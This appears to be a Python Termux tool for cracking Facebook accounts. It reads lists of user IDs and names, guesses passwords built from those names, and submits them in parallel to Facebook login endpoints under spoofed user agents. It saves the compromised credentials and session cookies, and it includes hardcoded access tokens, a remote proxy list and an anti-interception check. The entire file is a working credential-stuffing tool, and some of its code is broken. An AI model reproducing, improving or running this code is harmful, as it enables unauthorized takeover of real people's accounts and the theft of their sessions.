import os, sys, time, datetime, re, bs4, json, random, requests, subprocess, platform, uuid, string, base64
from os import path
import platform,json,time,re,random,sys,uuid,string,subprocess
import time
from datetime import datetime
import socket
import json
import requests as rq
from uuid import uuid4
import requests,zlib,platform
import os,sys,tempfile,string,random,subprocess,uuid
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(["GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820",'SM-S908B','SM-G960U1','SC-04J','SC-51B','SM-S9080','SM-M536S','SM-G996W','SM-E426S','SM-G975F','SM-A207F','SM-A013G','SM-A145R','SM-S901B','SM-A145P','SM-N975F','SM-M136B','SM-A035M','SM-A135M','SM-A536B','SM-M115F','SM-M115F','SM-M115M','SM-M115M','SM-M107F','SM-M107G','SM-M107Y','SM-M107M','SM-M105F','SM-M105G','SM-M105Y','SM-M105M','SM-M127F','SM-M135F','SM-M135F','SM-M136B','SM-M136B','SM-M205F','SM-M205FN','SM-M205G','SM-M205M','SM-M205N','GT-N7000','GT-I9220','SVC-E160L','SVC-E160S','SM-J701F','SM-J701F','SM-J701M','SM-J701MT','SM-J710FN','SM-J710F','SM-J710H','SM-J710M','SM-J710GN','SM-J710MN','SM-J710K','SM-J7108','SM-J710FQ','SM-J737F','SM-J737V','SM-J737T','SM-J737A','SM-J737P','SM-J737T1','SM-J737U','SM-J737S','SM-J730F','SM-J730FM','SM-S727VL','SM-J730K','SM-N981B','SM-N981B','SM-N981U','SM-N981U1','SM-N981W','SM-N9810','SM-N981N','SM-J610F','SM-J610F','SM-J610G','SM-J610FN','SM-N980F','SM-N980F','SM-N770F','SM-N770F','SM-N770F','SM-N975F','SM-N975U','SM-N9750','SM-N975U1','SM-N975W','SM-N975N','SM-N975X','SCV45','SM-N971U','SM-N971N', "SM-A426B", "SM-A426B/DS", "SM-A4260", "SM-A426U", "SM-A426U1", "SM-A426N", "SM-A736B", "SM-A736B/DS", "SM-A336E", "SM-A336B", "SM-A336B/DS", "SM-A336B/DSN", "SM-A336E/DS", "SM-A336M", "SM-A326B", "SM-A326B/DS", "SM-A326BR/DS", "SM-A326BR", "SM-A326U", "SM-A326W", "SM-A326U1", "SM-A326K", "SCG08", "SM-S326DL", "SM-N9150", "SM-N915A", "SM-N915D", "SM-N915F", "SM-N915FY", "SM-N915G", "SM-N915K", "SM-N915L", "SM-N915P", "SM-N915R4", "SM-N915S", "SM-N915T", "SM-N915V", "SM-N915W8", "SM-N915X", "SC-01G"])
 
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('pip install requests')
        os.system('python key.py')
except:pass
try:os.mkdir('/sdcard/KEYARUGA')
except:pass
os.system('clear')
print('\n\n Loading... Please wait and do not exit!\n')
try:
        os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")
except:pass
try:
    prox= requests.get('https://raw.githubusercontent.com/BestProfessionals/MUSLIWAHID/main/.prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('\n\033[1;36m   Checking Server....')
    
prox=open('.prox.txt','r').read().splitlines()
#============Bypass Protection============#
def bypass():
      x = open('/data/data/com.termux/usr/lib/python3.11/site-packages/requests/api.py','r').read()
      if "print(url)" in x:
             print("\33[1;91m TANGINAMO PAKYU")
      else:
             pass             
#============Capture Protection============#
first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(first+'sessions.py','r').read():
	pass
else:
	exit('\33[1;91m TANGINAMO PAKYU')             

ugen=[]
ugen2=[]
b=random.randrange(40,115)
c='0'
d=random.randrange(3000,6000)
e=random.randrange(20,100)
f='Mobile Safari/537.36'

g='[FB_IAB/FB4A;FBAV/'
h=random.randrange(400,499)
i='0'
j='0'
k=random.randrange(11,99)
l=random.randrange(11,111)
#=(f'{a}{b}.{c}.{d}.{e} {f}')
#=(f'{a}{b}.{c}.{d}.{e} {f} {g}{h}.{i}.{j}.{k}.{l}:]')

def mozilla_user_agent():
    android_versions = ["Android 7", "Android 8", "Android 9", "Android 10", "Android 11", "Android 12"]
    selected_android_version = random.choice(android_versions)
    
    android_models = ["Infinix X6525", "Infinix X6837", "Infinix X6836", "Infinix X6525", "Infinix X6831", "Infinix X6820", "Infinix X676B", "Infinix X6816", "Infinix X670", "Infinix X6817", "Infinix X662", "Infinix X688C", "Infinix X680", "Infinix X660", "Infinix X652B", "Infinix X653", "Infinix X663", "Infinix X627V", "Infinix X267"]
        
    selected_model = random.choice(android_models)

    user_agent = f"Mozilla/5.0 (Linux; {selected_android_version}; {selected_model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36"
    
    return user_agent

random_user_agent = mozilla_user_agent()

for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)

for xiaomi in range(3000):
    a='Mozilla/5.0 (Linux; Android 12; 22111317I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    xiao=(f'{a}{b}.{c}.{d}.{e} {f}')
    ugen.append(xiao)
    
    a='Mozilla/5.0 (Linux; Android 12; 22101316C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    xiao1=(f'{a}{b}.{c}.{d}.{e} {f}')
    ugen.append(xiao1)
    
    a='Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    xiao2=(f'{a}{b}.{c}.{d}.{e} {f} {g}{h}.{i}.{j}.{k}.{l}:]')
    ugen2.append(xiao2)
    
for realme in range(3000): 
    a='Mozilla/5.0 (Linux; Android 10; RMX2189) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    real=(f'{a}{b}.{c}.{d}.{e} {f}')
    ugen.append(real)
    
    a='Mozilla/5.0 (Linux; Android 10; RMX1921) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    real1=(f'{a}{b}.{c}.{d}.{e} {f}')
    ugen.append(real1)
    
    a='Mozilla/5.0 (Linux; Android 11; RMX1921 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    real2=(f'{a}{b}.{c}.{d}.{e} {f} {g}{h}.{i}.{j}.{k}.{l}:]')
    ugen2.append(real2)
    
for oppo in range(1000):
    a='Mozilla/5.0 (Linux; Android 10; CPH4299 Build/OPM1.829216.308; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    oppo1=(f'{a}{b}.{c}.{d}.{e} {f}')
    ugen.append(oppo1)
    
    a='Mozilla/5.0 (Linux; Android 12; CPH2363) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    oppo2=(f'{a}{b}.{c}.{d}.{e} {f}')
    ugen.append(oppo2)
        
def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP
    
from datetime import datetime
# Get the current date
today = datetime.now().date()

logo = ("""\033[1;37m

\x1b[1;33m /$$$$$$$  /$$$$$$$   /$$$$$$ 
\x1b[1;33m| $$__  $$| $$__  $$ /$$__  $$
\x1b[1;33m| $$  \ $$| $$  \ $$| $$  \ $$
\x1b[1;33m| $$  | $$| $$$$$$$/| $$  | $$
\x1b[1;33m| $$  | $$| $$__  $$| $$  | $$
\x1b[1;33m| $$  | $$| $$  \ $$| $$  | $$
\x1b[1;33m| $$$$$$$/| $$  | $$|  $$$$$$/
\x1b[1;33m|_______/ |__/  |__/ \______/                              
\x1b[1;91m Version: 1      
\x1b[1;33m ═══════════════════════════════════════════════
\x1b[1;91m Author    : justine sy | dro lynx
 \x1b[1;91mStatus    : FREE
\x1b[1;91m Ids will be saved in KEYARUGA folder
\x1b[1;33m ═══════════════════════════════════════════════""")

def log_in():
    os.system('clear')
    username=input(' [•] ENTER KEY: ')
    #r2 = requests.get('https://github.com/rakimsama/approval/blob/main/approve.txt').text
    if username in 'keyaruga':
    	menu()
        
    else: 
        print('     Wrong username!!')
        time.sleep(2)
        log_in()

def year(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :alif = ' 2009'
        elif ids[:9] in ['100000000']       :alif = ' 2009'
        elif ids[:8] in ['10000000']        :alif = ' 2009'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' 2009'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:alif = ' 2010'
        elif ids[:6] in ['100001']          :alif = ' 2010/2011'
        elif ids[:6] in ['100002','100003'] :alif = ' 2011/2012'
        elif ids[:6] in ['100004']          :alif = ' 2012/2013'
        elif ids[:6] in ['100005','100006'] :alif = ' 2013/2014'
        elif ids[:6] in ['100007','100008'] :alif = ' 2014/2015'
        elif ids[:6] in ['100009']          :alif = ' 2015'
        elif ids[:5] in ['10001']           :alif = ' 2015/2016'
        elif ids[:5] in ['10002']           :alif = ' 2016/2017'
        elif ids[:5] in ['10003']           :alif = ' 2018/2019'
        elif ids[:5] in ['10004']           :alif = ' 2019/2020'
        elif ids[:5] in ['10005']           :alif = ' 2020'
        elif ids[:5] in ['10006','10007','']:alif = ' 2021'
        elif ids[:5] in ['10008']           :alif = ' 2022'
        elif ids[:5] in ['10009']           :alif = ' 2023'
        else:alif=''
    elif len(ids) in [9,10]:
        alif = ' 2008/2009'
    elif len(ids)==8:
        alif = ' 2007/2008'
    elif len(ids)==7:
        alif = ' 2006/2007'
    else:alif=''
    return alif

def convert(time):
    date = datetime.strptime(time, '%Y-%m-%dT%H:%M:%S%z')
    year = date.year
    month = date.month
    day = date.day
    formatted_date = "{}/{}/{}".format(day, month, year)
    return formatted_date
    
def date(ids2):
    token = "EAAD6V7os0gcBOzZC6HWEon8PSEblzoWNCIKpSEvla8WRjb0ufZBB19LXZAshKYHikas7aTxVxSnuAFQjZCts2FZBxvlxleFmJaWvNc9VcdLchZBXetdWwjb5uOIL4ubz9vXcY0xAOwwy4OGqU8S0TACF2hsIRIAOG53uTQFO1pXqm5Gvb9mYPhATQRjIETmKaPBwZDZD"
    url = f"https://graph.facebook.com/{ids2}?fields=created_time&access_token={token}"
    headers1 = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-N920F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3056.24 Mobile Safari/537.36",
        "accept": "application/json, text/plain, /"
    }
    response = requests.get(url, headers=headers1)
    data = response.json()
    created_time = convert(data['created_time'])
    return created_time

def line():
        print('\x1b[1;33m ═══════════════════════════════════════════════')
def clear():
        os.system('clear')
        print(logo)
loop=0
lim=0
oks=[]
ids2=[]
cps=[]
twf=[]
pcp=[]
pck=[]
tp=0
id=[]
tokenku=[]
follower=[]
r="\033[1;91m"
g="\033[1;92m"
y="\033[1;93m"
b="\033[1;94m"
p="\033[1;95m"
c="\033[1;96m"
l="\033[1;97m"
A="\033[0m"
#--(light@Colours)---#
lr="\033[0;91m"
lg="\033[0;9m"
ly="\033[0;93m"
lb="\033[0;94m"
lp="\033[0;95m"
lc="\033[0;96m"
ll="\033[0;97m"
 
def followers(ids2):
    token = "EAAD6V7os0gcBOzZC6HWEon8PSEblzoWNCIKpSEvla8WRjb0ufZBB19LXZAshKYHikas7aTxVxSnuAFQjZCts2FZBxvlxleFmJaWvNc9VcdLchZBXetdWwjb5uOIL4ubz9vXcY0xAOwwy4OGqU8S0TACF2hsIRIAOG53uTQFO1pXqm5Gvb9mYPhATQRjIETmKaPBwZDZD"
    url = f"https://graph.facebook.com/{ids2}?fields=subscribers.limit(0)&access_token={token}"
    headers1 = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-N920F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3056.24 Mobile Safari/537.36",
        "accept": "application/json, text/plain, /"
    }
    response = requests.get(url, headers=headers1)
    data = response.json()
    follower = data['subscribers']['summary']['total_count'] or '0'
    return follower
 
def menu():
        global lim,tp
        try:
                clear()
                print(' \x1b[1;91mIP address  :  '+get_ip_address())
                print(" Current date: ",today)
                line()
                sj="server on"
                if "server on" in sj:
                        #clear()
                        print(' [1] File Cloning')
                        print(' [2] File Dump (not fixed)')
                        line()
                        xd=input(' [•] Choose option: ')
                        if xd in ['1','01']:
                                file_cloning() 
                        elif xd in ['2','02']:   
                                import FILE64             
                        elif xd in ['0','00']:
                                exit
                                print('\033[1;96m [+] THANKS FOR USING')
                                
                        else:
                                print('\033[1;91m [+] OPTION NOT FOUND IN MENU...');time.sleep(1)
                                menu() 
                else:
                        print(' [+] Will be back soon')
 
 
                        print('\033[1;97m [+]-------------------------------------------------------')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n [+] No internet connection ...')
                exit()
 
def file_cloning():
                                clear()
                                print(' \x1b[1;91mIP address  :  '+get_ip_address())
                                print(" Current date: ",today)
                                line()
                                print(' [•] Put file example:  /sdcard/File.txt  etc..')
                                print(' [•] Make sure file is in your storage')
                                line()
                                file = input(' [•] Put file path\033[1;37m: ')
                                try:    
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' [•] File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(' \x1b[1;91mIP address  :  '+get_ip_address())
                                print(" Current date: ",today)
                                line()
                                print(' [•] Choose method')
                                line()
                                print(' [1] Method 1\033[1;97m \n [2] Method 2(soon)')
                                line()
                                mthd=input(' [•] Choose: ')
                                line()
                                plist = []
                                print(' [•] Select crack method');line();print(' [1] Auto Password \n [2] Choice Password \n')
                                ppp=input(' [•] Choose: ')
                                if ppp in ['1','01']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('first123')
                                        plist.append('first12345')
                                        plist.append('First Last')
                                        plist.append('first1234')
                                        plist.append('firstlast123')
                                        plist.append('First123')
                                        plist.append("last123")
                                        plist.append("last1234")
                                        plist.append("last12345")
                                        plist.append('firstpogi')
                                        plist.append('firstganda')
                                        plist.append('first143')
                                        plist.append('first22')
                                        plist.append('first09')
                                        plist.append('first12')
                               
                                else:
                                        try:
                                                line()
                                                ps_limit = int(input(' [•] How many passwords do you want to add ? '))
                                        except:
                                                ps_limit =1
                                        line()
                                        print('\033[1;32m [•] example: first last,firtslast,first123')
                                        line()
                                        for i in range(ps_limit):
                                                plist.append(input(f' [•] Put password {i+1}: '))
                                line()
                                print(' [•] Do you want to show CP ids? (Y/n): ')
                                cx=input(' [•] Choice: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                    pcp.append('n')
                                line() 
                                print(' [•] Do you want to show cookies? (Y/n): ')
                                cz=input(' [•] Choice: ')
                                if cz in ['y','Y','yes','Yes','1']:
                                        pck.append('y')
                                else:
                                    pck.append('n')    
                                
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        lim=int(total_ids)
                                        print(' \x1b[1;91mIP address  :  '+get_ip_address())
                                        print(" Current date: ",today)
                                        line()
                                        print(' [•] Total ids : \033[1;32m'+total_ids)
                                        print("\033[1;32m [•] CLONING STARTED")
                                        print("\033[1;32m [•] ON/OFF AIRPLANE MODE FOR BEST RESULT")                                                        
                                        print("\033[1;32m [•] OK IDS WILL BE SAVED IN KEY-OK.txt")
                                        line()
                                        
                            
                                        
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(m2,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(api1,ids,names,passlist)
 
                                print('\033[1;37m')
 
                                line()
                                print(' [•] The process has completed')
                                print(' [•] \033[1;32m [+] Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                                line()
                                input(' [•] Press enter to back ')
                                os.system('python key.py')
                                menu() 
          
def ffb(ids,names,passlist):
        global loop,oks,cps,ids2
        sys.stdout.write('\r\r\033[1;37m [KEY-M1] %s|\033[1;32mALIVE:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Afghan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        AWM=session.cookies.get_dict().keys()
                        if "c_user" in AWM:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                open('/sdcard/KEYARUGA/KEY-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                open('/sdcard/KEYARUGA/KEY-OK-COKI.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                                ids2.append(ids)
                                print(f'\r\033[1;32m╭─[•]STATUS: [DRO-OK] \n├─[•] UID: {ids} \n├─[•] PASS: {pas} \n├─[•] LINK: https://facebook.com/{ids} \n├─[•] CREATION DATE: {date(ids)} \n╰─[•] FOLLOWERS: {followers(ids)}')  
                  
                                if 'y' in pck:
                                        print('\r\r\033[1;32m COOKIES: \x1b[1;33m '+kuki)
                                        line()
                                        break
                                else:
                                        break
                        elif 'checkpoint' in AWM:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [KEY-CP] '+ids+' | '+pas+'\033[1;97m'+' |'+year(ids))
                                        open('/sdcard/KEYARUGA/KEY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
def m2(ids,names,passlist):
    global oks,loop
    sys.stdout.write('\r\r\033[1;37m [KEY-M2] %s|\033[1;32mALIVE:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    try:
        first=names.split(' ')[0]
        try:
            last=names.split(' ')[1]
        except:
            last=first
        ps = first.lower()
        ps2 = last.lower()   
        for pw in passlist:
            pas = pw.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            ua = 'Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBPN/'+fbpn+';FBLC/'+fblc+';FBBV/'+fbbv+';FBCR/'+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+fbsv+'.0.1;FBCA/'+fbca+';FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'.replace('\n','')
            uax = random.choice(ugen)
            ua1 = '[FBAN/FB4A;FBAV/692.3.0.35.97;[FBAN/MessengerLite;FBAV/751.3.9.60.94;FBBV/357319953;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/332651469;FBCR/en_GB;FBMF/Infinix Smart 4;FBBD/Infinix Smart 4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.2,width=640,height=1292};FB_FW/1;]'
            head={
            "User-Agent":ua1,"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"WIFI","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"WIFI","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            url='https://b-graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:
                print('\r\r\033[1;32m [KEY-OK] %s | %s'%(ids,pas)+' |'+year(ids))
                print(' Link: https://www.facebook.com/'+ids)
                oks.append(ids)
                open('/sdcard/KEYARUGA/KEY2-OK.txt','a').write(ids+'>>'+pas+'\n')
                session = req['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                open('/sdcard/KEYARUGA/KEY-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                
                if 'y' in pck:
                	    print('\r\r\033[1;32m Cookies: \x1b[1;33m '+cookie)
                else:
                        break
            elif 'www.facebook.com' in req['error']['message']:
                if 'y' in pcp:
                        print('\r\r\x1b[38;5;208m [KEY-CP] '+ids+' | '+pas+'\033[1;97m'+' |'+year(ids))
                        open('/sdcard/KEYARUGA/KEY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
            else:
                continue
        loop+=1
    except:
        pass
        
'''def main_apv():
    imt = 'KEY-'
    os.system('clear')
    print(logo)
    try:
        key1 = open('/sdcard/key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
       
        myid = uuid.uuid4().hex[:30]
        
        open('/sdcard/key.txt', 'w').write(imt+myid)
    
        input(' Exit And Again Run The Command');os.system('python dro.py')
        

    r1 = requests.get('https://github.com/rakimsama/approval/blob/main/approve.txt').text
   
    if key1 in r1:
         menu()
    else:
        os.system('clear')
        print(logo)
        print(' \033[1;37mKey : \033[1;32m' + key1)
        line()
        print (' \033[1;37mMessage Tool owner to approve your key') 
      
        input(' \033[1;37mPress Enter ')
        os.system('xdg-open https://facebook.com/100015122384760/')
        
        main_apv()
log_in()        
main_apv()'''
log_in()
try:
	menu()
except requests.exceptions.ConnectionError:
	print('No internet connection ...')
	exit()
except:exit()    